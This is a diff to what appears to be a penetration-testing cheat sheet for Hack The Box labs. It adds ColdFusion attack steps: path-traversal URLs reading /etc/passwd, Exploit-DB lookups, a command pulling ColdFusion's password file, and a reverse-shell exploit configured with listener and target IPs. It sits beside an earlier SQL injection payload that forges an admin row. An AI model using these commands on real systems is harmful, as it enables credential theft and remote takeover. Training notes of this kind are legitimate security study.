@@ -223,10 +223,36 @@ Tick / Fat APP:
   服务器注入:  select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'
 
 
+  SEE 777_
+
+
+ColdFusion:
+  searchsploit adobe coldfusion
+
+  http://example.com/index.cfm?directory=../../../etc/&file=passwd
+  http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
+
+  searchsploit -p 14641
+  searchsploit -m 14641
+  python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
+
+  searchsploit -u 或 apt update && apt install exploitdb 来更新你本地的 Exploit-DB 数据库
+  ***
+  cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+
+  if __name__ == '__main__':
+    # Define some information
+    lhost = '10.10.14.55' # HTB VPN IP
+    lport = 4444 # A port not in use on localhost
+    rhost = "10.129.247.30" # Target IP
+    rport = 8500 # Target Port
+    filename = uuid.uuid4().hex
+
+  python3 50057.py 
 
 
 
-
-
-
-
+IIS:
+  
+  
+  
